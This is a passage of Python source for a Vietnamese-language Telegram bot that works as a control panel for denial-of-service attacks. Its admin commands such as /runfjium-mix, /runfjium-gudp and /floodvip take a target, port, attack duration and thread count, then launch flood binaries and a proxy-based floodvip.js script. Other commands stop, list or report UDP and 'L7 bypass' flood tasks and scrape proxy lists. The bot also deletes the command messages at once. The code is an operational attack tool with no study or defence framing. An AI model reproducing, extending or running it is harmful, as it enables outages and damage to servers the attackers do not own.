                raise ValueError("Time phải từ 1-3600 giây")
            if threads_int <= 0 or threads_int > 1000:
                raise ValueError("Threads phải từ 1-1000")
        except ValueError as ve:
            bot.edit_message_text(f"❌ Tham số không hợp lệ: {ve}",
                                chat_id=message.chat.id,
                                message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return

        # Kiểm tra file fjium-mix
        fjium_mix_path = "fjium-mix"
        if os.name == 'nt':  # Windows
            fjium_mix_path += ".exe"

        if not os.path.exists(fjium_mix_path):
            bot.edit_message_text(
                "❌ File fjium-mix không tồn tại!\n"
                "📥 Vui lòng tải file fjium-mix vào thư mục bot.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return

        # Tự động chmod +x cho file fjium-mix
        try:
            if os.name != 'nt':  # Không phải Windows
                result = subprocess.run(['chmod', '+x', fjium_mix_path],
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    logger.info(f"Đã chmod +x cho {fjium_mix_path}")
                else:
                    logger.warning(f"chmod failed for {fjium_mix_path}: {result.stderr}")
            else:
                logger.info(f"Windows detected, skipping chmod for {fjium_mix_path}")
        except subprocess.TimeoutExpired:
            logger.warning(f"chmod timeout cho {fjium_mix_path}")
        except FileNotFoundError:
            logger.warning(f"chmod command not found")
        except Exception as e:
            logger.warning(f"Không thể chmod +x cho {fjium_mix_path}: {e}")

        # Cập nhật thông báo
        bot.edit_message_text(
            f"✅ Lệnh /runfjium-mix đã được nhận!\n"
            f"🎯 Target: {target}:{port}\n"
            f"⏱️ Thời gian: {time}s\n"
            f"🧵 Threads: {threads}\n"
            f"🔄 Đang khởi động fjium-mix...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )

        # Tạo lệnh chạy fjium-mix
        if os.name == 'nt':  # Windows
            cmd = [fjium_mix_path, target, port, time, threads]
        else:  # Linux/Unix
            cmd = [f"./{fjium_mix_path}", target, port, time, threads]

        # Chạy subprocess
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'fjium-mix', message)

    except Exception as e:
        logger.error(f"Error in /runfjium-mix: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-mix: {str(e)}",
                                chat_id=message.chat.id,
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-mix: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['runfjium-gudp'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_runfjium_gudp(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runfjium-gudp...")

        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)

        # Phân tích tham số từ lệnh
        args = message.text.split()
        if len(args) < 4 or len(args) > 5:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runfjium-gudp <target> <port> <time> [threads]\n"
                "Ví dụ: /runfjium-gudp example.com 80 60\n"
                "Ví dụ: /runfjium-gudp example.com 80 60 150\n"
                "📋 Tham số:\n"
                "• target: Domain hoặc IP target\n"
                "• port: Port target\n"
                "• time: Thời gian tấn công (giây)\n"
                "• threads: Số luồng (mặc định: 150)",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        target = args[1]
        port = args[2]
        time = args[3]
        threads = args[4] if len(args) > 4 else "150"

        # Kiểm tra tính hợp lệ của tham số
        try:
            port_int = int(port)
            time_int = int(time)
            threads_int = int(threads)
            if port_int <= 0 or port_int > 65535:
                raise ValueError("Port phải từ 1-65535")
            if time_int <= 0 or time_int > 3600:
                raise ValueError("Time phải từ 1-3600 giây")
            if threads_int <= 0 or threads_int > 1000:
                raise ValueError("Threads phải từ 1-1000")
        except ValueError as ve:
            bot.edit_message_text(f"❌ Tham số không hợp lệ: {ve}",
                                chat_id=message.chat.id,
                                message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return

        # Kiểm tra file fjium-gudp
        fjium_gudp_path = "fjium-gudp"
        if os.name == 'nt':  # Windows
            fjium_gudp_path += ".exe"

        if not os.path.exists(fjium_gudp_path):
            bot.edit_message_text(
                "❌ File fjium-gudp không tồn tại!\n"
                "📥 Vui lòng tải file fjium-gudp vào thư mục bot.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return

        # Tự động chmod +x cho file fjium-gudp
        try:
            if os.name != 'nt':  # Không phải Windows
                result = subprocess.run(['chmod', '+x', fjium_gudp_path],
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    logger.info(f"Đã chmod +x cho {fjium_gudp_path}")
                else:
                    logger.warning(f"chmod failed for {fjium_gudp_path}: {result.stderr}")
            else:
                logger.info(f"Windows detected, skipping chmod for {fjium_gudp_path}")
        except subprocess.TimeoutExpired:
            logger.warning(f"chmod timeout cho {fjium_gudp_path}")
        except FileNotFoundError:
            logger.warning(f"chmod command not found")
        except Exception as e:
            logger.warning(f"Không thể chmod +x cho {fjium_gudp_path}: {e}")

        # Cập nhật thông báo
        bot.edit_message_text(
            f"✅ Lệnh /runfjium-gudp đã được nhận!\n"
            f"🎯 Target: {target}:{port}\n"
            f"⏱️ Thời gian: {time}s\n"
            f"🧵 Threads: {threads}\n"
            f"🔄 Đang khởi động fjium-gudp...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )

        # Tạo lệnh chạy fjium-gudp
        if os.name == 'nt':  # Windows
            cmd = [fjium_gudp_path, target, port, time, threads]
        else:  # Linux/Unix
            cmd = [f"./{fjium_gudp_path}", target, port, time, threads]

        # Chạy subprocess
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'fjium-gudp', message)

    except Exception as e:
        logger.error(f"Error in /runfjium-gudp: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-gudp: {str(e)}",
                                chat_id=message.chat.id,
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-gudp: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['floodvip'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_floodvip(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /floodvip...")

        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)

        # Phân tích tham số từ lệnh
        args = message.text.split()
        if len(args) != 6:
            bot.edit_message_text(
                "⚠️ Cách dùng: /floodvip <host> <time> <rate> <thread> <proxies.txt>\n"
                "Ví dụ: /floodvip example.com 60 1000 10 proxies.txt\n"
                "📋 Tham số:\n"
                "• host: Target URL hoặc IP\n"
                "• time: Thời gian tấn công (giây)\n"
                "• rate: Tốc độ tấn công\n"
                "• thread: Số luồng\n"
                "• proxies.txt: File chứa danh sách proxy",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        host = args[1]
        time = args[2]
        rate = args[3]
        thread = args[4]
        proxies_file = args[5]

        # Kiểm tra tính hợp lệ của tham số
        try:
            time_int = int(time)
            rate_int = int(rate)
            thread_int = int(thread)
            if time_int <= 0 or time_int > 3600:
                raise ValueError("Time phải từ 1-3600 giây")
            if rate_int <= 0 or rate_int > 10000:
                raise ValueError("Rate phải từ 1-10000")
            if thread_int <= 0 or thread_int > 1000:
                raise ValueError("Thread phải từ 1-1000")
        except ValueError as ve:
            bot.edit_message_text(f"❌ Tham số không hợp lệ: {ve}",
                                chat_id=message.chat.id,
                                message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return

        # Kiểm tra file floodvip.js
        if not os.path.isfile('floodvip.js'):
            bot.edit_message_text(
                "❌ File 'floodvip.js' không tồn tại!\n"
                "📥 Vui lòng đảm bảo file floodvip.js có trong thư mục bot.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        # Kiểm tra file proxy
        if not os.path.isfile(proxies_file):
            bot.edit_message_text(
                f"❌ File proxy '{proxies_file}' không tồn tại!\n"
                "📁 Vui lòng kiểm tra tên file proxy hoặc tạo file proxy hợp lệ.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        # Cập nhật thông báo
        bot.edit_message_text(
            f"🚀 **Đang khởi động floodvip attack...**\n"
            f"🎯 **Target:** `{host}`\n"
            f"⏱️ **Time:** {time}s\n"
            f"📊 **Rate:** {rate}\n"
            f"🧵 **Thread:** {thread}\n"
            f"📁 **Proxy:** {proxies_file}\n\n"
            f"🔄 Đang khởi động tác vụ...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode='Markdown'
        )

        # Tạo lệnh chạy floodvip.js
        cmd = ['node', 'floodvip.js', host, time, rate, thread, proxies_file]
        logger.info(f"Đang chạy floodvip.js với các tham số: {cmd}")

        # Tự động xóa thông báo khởi động sau 10 giây
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)

        # Chạy script floodvip.js bất đồng bộ
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'floodvip', message)

        # Log hoạt động
        db.log_activity(
            message.from_user.id,
            "RUN_FLOODVIP",
            f"host={host}, time={time}, rate={rate}, thread={thread}, proxy={proxies_file}"
        )

    except Exception as e:
        logger.error(f"Đã xảy ra lỗi trong /floodvip: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /floodvip: {str(e)}",
                                chat_id=message.chat.id,
                                message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /floodvip: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['stopovh'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_stopovh(message):
    # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
    processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /stopovh...")
    
    # Xóa tin nhắn lệnh sau khi đã gửi thông báo
    delete_message_immediately(message.chat.id, message.message_id)
    
    # Cập nhật thông báo
    bot.edit_message_text(
        "✅ Lệnh /stopovh đã được nhận!\n🔄 Đang dừng tác vụ udpovh...",
        chat_id=message.chat.id,
        message_id=processing_msg.message_id
    )
    
    stop_subprocess_safe(message.from_user.id, message.chat.id, 'udpovh', processing_msg)


def _stop_all_for_user(target_user_id: int, chat_id: int, processing_msg=None, across_all_chats: bool=False):
    """Dừng tất cả tác vụ thuộc user. Nếu across_all_chats=True sẽ dừng ở mọi chat."""
    stopped = 0
    for (uid, cid, task_key), proc in list(running_tasks.items()):
        try:
            if uid == target_user_id and (across_all_chats or cid == chat_id) and proc and proc.poll() is None:
                if os.name == 'nt':
                    try:
                        proc.terminate()
                        proc.wait(timeout=3)
                    except Exception:
                        try:
                            subprocess.run(['taskkill', '/PID', str(proc.pid), '/T', '/F'], capture_output=True)
                        except Exception:
                            pass
                else:
                    try:
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    except Exception:
                        try:
                            os.kill(proc.pid, signal.SIGTERM)
                        except Exception:
                            pass
                running_tasks[(uid, cid, task_key)] = None
                stopped += 1
        except Exception:
            continue
    return stopped

@bot.message_handler(commands=['stopall'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_stopall(message):
    processing_msg = bot.reply_to(message, "🔄 Đang dừng tất cả tác vụ của bạn...")
    delete_message_immediately(message.chat.id, message.message_id)
    stopped = _stop_all_for_user(message.from_user.id, message.chat.id, processing_msg)
    try:
        bot.edit_message_text(f"✅ Đã dừng {stopped} tác vụ của bạn.", chat_id=message.chat.id, message_id=processing_msg.message_id)
    except Exception:
        pass
    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)

@bot.message_handler(commands=['stopuser'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_stopuser(message):
    processing_msg = bot.reply_to(message, "🔄 Đang xử lý /stopuser...")
    delete_message_immediately(message.chat.id, message.message_id)
    args = message.text.strip().split()
    if len(args) != 2:
        bot.edit_message_text("⚠️ Cách dùng: /stopuser <user_id>", chat_id=message.chat.id, message_id=processing_msg.message_id)
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
        return
    try:
        target_id = int(args[1])
    except ValueError:
        bot.edit_message_text("❌ User ID phải là số nguyên hợp lệ!", chat_id=message.chat.id, message_id=processing_msg.message_id)
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
        return
    stopped = _stop_all_for_user(target_id, message.chat.id, processing_msg, across_all_chats=True)
    try:
        bot.edit_message_text(f"✅ Đã dừng {stopped} tác vụ của user {target_id}.", chat_id=message.chat.id, message_id=processing_msg.message_id)
    except Exception:
        pass
    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)

@bot.message_handler(commands=['statusovh'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_statusovh(message):
    # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
    processing_msg = bot.reply_to(message, "🔄 Đang kiểm tra trạng thái...")
    
    # Xóa tin nhắn lệnh sau khi đã gửi thông báo
    delete_message_immediately(message.chat.id, message.message_id)
    
    key = (message.from_user.id, message.chat.id, 'udpovh')
    proc = running_tasks.get(key)
    if proc and proc.poll() is None:
        bot.edit_message_text(
            f"✅ Tác vụ `udpovh` đang chạy (PID {proc.pid}).",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
    else:
        bot.edit_message_text(
            "ℹ️ Tác vụ `udpovh` hiện không chạy.",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)



@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood', 'stopudpbypass', 'stopl7bypass', 'stopfjium-dns', 'stopfjium-mix', 'stopfjium-gudp', 'stopfloodvip'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_stop_task(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh dừng tác vụ...")
        
        cmd = message.text.lower()
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        task_name = ""
        task_key = ""
        
        if cmd.startswith('/stopkill'):
            task_name = "killjs"
            task_key = "killjs"
        elif cmd.startswith('/stopudp'):
            task_name = "udp"
            task_key = "udp"
        elif cmd.startswith('/stopproxies'):
            task_name = "scrapeproxies"
            task_key = "scrapeproxies"
        elif cmd.startswith('/stopflood'):
            task_name = "flood"
            task_key = "flood"
        elif cmd.startswith('/stopudpbypass'):
            task_name = "udpbypass"
            task_key = "udpbypass"
            logger.info(f"User {user_id} requesting to stop udpbypass task")
        elif cmd.startswith('/stopl7bypass'):
            task_name = "l7bypass"
            task_key = "l7bypass"
            logger.info(f"User {user_id} requesting to stop l7bypass task")
        elif cmd.startswith('/stopfjium-dns'):
            task_name = "fjium-dns"
            task_key = "fjium-dns"
            logger.info(f"User {user_id} requesting to stop fjium-dns task")
        elif cmd.startswith('/stopfjium-mix'):
            task_name = "fjium-mix"
            task_key = "fjium-mix"
            logger.info(f"User {user_id} requesting to stop fjium-mix task")
        elif cmd.startswith('/stopfjium-gudp'):
            task_name = "fjium-gudp"
            task_key = "fjium-gudp"
            logger.info(f"User {user_id} requesting to stop fjium-gudp task")
        elif cmd.startswith('/stopfloodvip'):
            task_name = "floodvip"
            task_key = "floodvip"
            logger.info(f"User {user_id} requesting to stop floodvip task")
        
        # Cập nhật thông báo
        try:
            bot.edit_message_text(
                f"✅ Lệnh dừng tác vụ `{task_name}` đã được nhận!\n🔄 Đang xử lý...",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
        except Exception as edit_error:
            logger.error(f"Error editing processing message: {edit_error}")
            # Fallback: gửi tin nhắn mới
            processing_msg = bot.send_message(chat_id, f"✅ Lệnh dừng tác vụ `{task_name}` đã được nhận!\n🔄 Đang xử lý...")
        
        # Xóa tin nhắn lệnh sau khi đã xử lý
        delete_message_immediately(message.chat.id, message.message_id)
        
        # Gọi hàm dừng tác vụ với thông tin cần thiết
        if task_key:
            try:
                stop_subprocess_safe(user_id, chat_id, task_key, processing_msg)
            except Exception as stop_error:
                logger.error(f"Error calling stop_subprocess_safe: {stop_error}")
                # Cập nhật thông báo lỗi
                try:
                    bot.edit_message_text(
                        f"❌ Lỗi khi xử lý lệnh dừng tác vụ `{task_name}`: {stop_error}",
                        chat_id=chat_id,
                        message_id=processing_msg.message_id
                    )
                except Exception as final_edit_error:
                    logger.error(f"Final error editing message: {final_edit_error}")
                    bot.send_message(chat_id, f"❌ Lỗi khi xử lý lệnh dừng tác vụ `{task_name}`: {stop_error}")
        else:
            logger.error(f"No task_key found for command: {cmd}")
            bot.edit_message_text(
                f"❌ Lỗi: Không thể xác định tác vụ cần dừng.",
                chat_id=chat_id,
                message_id=processing_msg.message_id
            )
        
    except Exception as e:
        logger.error(f"Error stopping task: {e}")
        try:
            # Cố gắng cập nhật thông báo lỗi
            bot.edit_message_text(f"❌ Lỗi khi dừng tác vụ: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except Exception as edit_error:
            logger.error(f"Error editing error message: {edit_error}")
            try:
                # Fallback: gửi tin nhắn mới
                sent = bot.reply_to(message, f"❌ Lỗi khi dừng tác vụ: {str(e)}")
                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
            except Exception as reply_error:
                logger.error(f"Error sending fallback message: {reply_error}")
                # Final fallback: gửi tin nhắn trực tiếp
                try:
                    bot.send_message(message.chat.id, f"❌ Lỗi khi dừng tác vụ: {str(e)}")
                except Exception as final_error:
                    logger.error(f"Final fallback failed: {final_error}")

@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood', 'statusudpbypass', 'statusl7bypass', 'statusfjium-dns', 'statusfjium-mix', 'statusfjium-gudp', 'statusfloodvip'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_status_task(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang kiểm tra trạng thái...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        cmd = message.text.lower()
        user_id = message.from_user.id
        chat_id = message.chat.id
        if 'kill' in cmd:
            task_key = 'killjs'
        elif 'udpbypass' in cmd:  # Kiểm tra udpbypass trước udp
            task_key = 'udpbypass'
        elif 'l7bypass' in cmd:  # Kiểm tra l7bypass
            task_key = 'l7bypass'
        elif 'udp' in cmd:
            task_key = 'udp'
        elif 'proxies' in cmd:
            task_key = 'scrapeproxies'
        elif 'flood' in cmd:
            task_key = 'flood'
        elif 'fjium-dns' in cmd:
            task_key = 'fjium-dns'
        elif 'fjium-mix' in cmd:
            task_key = 'fjium-mix'
        elif 'fjium-gudp' in cmd:
            task_key = 'fjium-gudp'
        elif 'floodvip' in cmd:
            task_key = 'floodvip'
        else:
            bot.edit_message_text(
                "❌ Lệnh không hợp lệ.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return
        key = (user_id, chat_id, task_key)
        proc = running_tasks.get(key)
        if proc and proc.poll() is None:
            bot.edit_message_text(
                f"✅ Tác vụ `{task_key}` đang chạy (PID {proc.pid}).",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
        else:
            bot.edit_message_text(
                f"ℹ️ Tác vụ `{task_key}` hiện không chạy.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
    except Exception as e:
        logger.error(f"Error checking task status: {e}")
        try:
            bot.edit_message_text(f"❌ Lỗi khi kiểm tra trạng thái tác vụ: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Lỗi khi kiểm tra trạng thái tác vụ: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['listtasks'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_listtasks(message):
    try:
        lines = ["📋 Tác vụ đang chạy:"]
        count = 0
        for (uid, cid, task_key), proc in list(running_tasks.items()):
            if proc and proc.poll() is None:
                count += 1
                lines.append(f"- user={uid} chat={cid} task={task_key} pid={proc.pid}")
        if count == 0:
            text = "ℹ️ Không có tác vụ nào đang chạy."
        else:
            text = "\n".join(lines)
        sent = bot.reply_to(message, text)
        auto_delete_response(message.chat.id, message.message_id, sent, delay=20)
    except Exception as e:
        logger.error(f"/listtasks error: {e}")
        sent = bot.reply_to(message, "❌ Lỗi khi liệt kê tác vụ")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['statusall'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_statusall(message):
    try:
        by_task = {}
        total = 0
        for (uid, cid, task_key), proc in list(running_tasks.items()):
            if proc and proc.poll() is None:
                total += 1
                by_task[task_key] = by_task.get(task_key, 0) + 1
        lines = [f"📊 Tổng tác vụ đang chạy: {total}"]
        for k, v in by_task.items():
            lines.append(f"- {k}: {v}")
        sent = bot.reply_to(message, "\n".join(lines))
        auto_delete_response(message.chat.id, message.message_id, sent, delay=20)
    except Exception as e:
        logger.error(f"/statusall error: {e}")
        sent = bot.reply_to(message, "❌ Lỗi khi xem trạng thái tổng")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['stopallglobal'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_stopallglobal(message):
    processing_msg = bot.reply_to(message, "🔄 Đang dừng toàn bộ tác vụ của mọi user...")
    delete_message_immediately(message.chat.id, message.message_id)
    stopped = 0
    for (uid, cid, task_key), proc in list(running_tasks.items()):
        if proc and proc.poll() is None:
            try:
                if os.name == 'nt':
                    try:
                        proc.terminate()
                        proc.wait(timeout=3)
                    except Exception:
                        subprocess.run(['taskkill', '/PID', str(proc.pid), '/T', '/F'], capture_output=True)
                else:
                    try:
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    except Exception:
                        os.kill(proc.pid, signal.SIGTERM)
                running_tasks[(uid, cid, task_key)] = None
                stopped += 1
            except Exception:
                pass
    try:
        bot.edit_message_text(f"✅ Đã dừng {stopped} tác vụ trên toàn hệ thống.", chat_id=message.chat.id, message_id=processing_msg.message_id)
    except Exception:
        pass
    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
@bot.message_handler(commands=['scrapeproxies'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_scrapeproxies(message):
    # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
    processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /scrapeproxies...")
    
    # Xóa tin nhắn lệnh sau khi đã gửi thông báo
    delete_message_immediately(message.chat.id, message.message_id)
    
    user_id = message.from_user.id
    chat_id = message.chat.id
    task_key = "scrapeproxies"
    key = (user_id, chat_id, task_key)
    proc = running_tasks.get(key)
    if proc and proc.poll() is None:
        bot.edit_message_text("❌ Tác vụ thu thập proxy đang chạy rồi. Vui lòng đợi hoặc dừng rồi chạy lại.", 
                            chat_id=message.chat.id, 
                            message_id=processing_msg.message_id)
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
        return
    try:
        # Use different approach for Windows vs Unix
        if os.name == 'nt':  # Windows
            proc = subprocess.Popen(
                ['python', 'scrape.py'],  # Use 'python' instead of 'python3' on Windows
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
            )
        else:  # Unix/Linux
            proc = subprocess.Popen(
                ['python3', 'scrape.py'],  # Đổi tên file nếu bạn đặt khác
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid
            )
        running_tasks[key] = proc
        
        # Cập nhật thông báo thành công
        bot.edit_message_text(
            "✅ Lệnh /scrapeproxies đã được nhận!\n"
            "🔄 Đang bắt đầu thu thập proxy từ các nguồn...\n"
            "⏳ Quá trình này có thể mất vài phút.\n"
            "📁 Kết quả sẽ được lưu vào file proxies.txt",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=30)
    except Exception as e:
        logger.error(f"Error starting scrapeproxies task: {e}")
        bot.edit_message_text(f"❌ Lỗi khi bắt đầu thu thập proxy: {str(e)}", 
                            chat_id=message.chat.id, 
                            message_id=processing_msg.message_id)
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)

@bot.message_handler(commands=['testudpbypass'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_testudpbypass(message):
    """Test lệnh udpbypass"""
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🧪 Đang test lệnh udpbypass...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        user_id = message.from_user.id
        chat_id = message.chat.id
        task_key = "udpbypass"
        key = (user_id, chat_id, task_key)
        
        # Kiểm tra trạng thái hiện tại
        proc = running_tasks.get(key)
        status_text = (
            f"🧪 *TEST LỆNH UDPBYPASS*\n\n"
            f"👤 User ID: {user_id}\n"
            f"💬 Chat ID: {chat_id}\n"
            f"🔑 Task Key: {task_key}\n"
            f"🔍 Key: {key}\n"
            f"🔄 Trạng thái tác vụ: {'Đang chạy' if proc and proc.poll() is None else 'Không chạy'}\n"
            f"📊 Tổng tác vụ đang chạy: {sum(1 for p in running_tasks.values() if p and p.poll() is None)}\n"
            f"📋 Danh sách tác vụ: {list(running_tasks.keys())}"
        )
        
        bot.edit_message_text(status_text, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=30)
        
    except Exception as e:
        logger.error(f"Error in /testudpbypass: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi xảy ra: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi xảy ra: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['sysinfo'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_sysinfo(message):
    try:
        text = (
            f"🖥️ THÔNG TIN HỆ THỐNG\n"
            f"{get_system_info_text()}\n"
            f"🕐 Uptime bot: {get_uptime()}\n"
        )
        sent = bot.reply_to(message, text)
        auto_delete_response(message.chat.id, message.message_id, sent, delay=20)
    except Exception as e:
        logger.error(f"/sysinfo error: {e}")
        sent = bot.reply_to(message, "❌ Không thể lấy thông tin hệ thống.")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['checkdelete'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_checkdelete(message):
    try:
        test = bot.send_message(message.chat.id, "🧪 Test delete message...")
        ok = safe_delete_message(message.chat.id, test.message_id, retries=2)
        if ok:
            sent = bot.reply_to(message, "✅ Bot có thể xóa tin nhắn của chính mình trong chat này.")
        else:
            sent = bot.reply_to(message, "❌ Bot KHÔNG thể xóa tin nhắn ở chat này. Hãy cấp quyền Delete messages nếu là nhóm/supergroup.")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
    except Exception as e:
        logger.error(f"/checkdelete error: {e}")
        sent = bot.reply_to(message, "❌ Lỗi khi kiểm tra quyền xóa.")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['resources'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_resources(message):
    """Hiển thị thông tin tài nguyên hệ thống"""
    try:
        status = resource_manager.get_resource_status()
        
        # Tạo thông báo chi tiết
        resource_text = (
            f"📊 *THÔNG TIN TÀI NGUYÊN HỆ THỐNG*\n\n"
            f"🖥️ *CPU:* {status.get('cpu_percent', 0):.1f}%\n"
            f"🧠 *RAM:* {status.get('ram_percent', 0):.1f}% "
            f"({status.get('ram_used_gb', 0):.1f}/{status.get('ram_total_gb', 0):.1f} GB)\n\n"

            f"🔄 *TÁC VỤ ĐANG CHẠY:*\n"
            f"• Toàn hệ thống: {status['global_tasks']}/{status['max_global_tasks']}\n"
            f"• Tác vụ của bạn: {status['user_tasks'].get(message.from_user.id, 0)}/{status['max_user_tasks']}\n"
            f"• Tổng tác vụ active: {status['active_tasks']}\n\n"
            f"⚙️ *GIỚI HẠN:*\n"
            f"• Tác vụ/user: {status['max_user_tasks']}\n"
            f"• Tác vụ toàn hệ: {status['max_global_tasks']}\n"
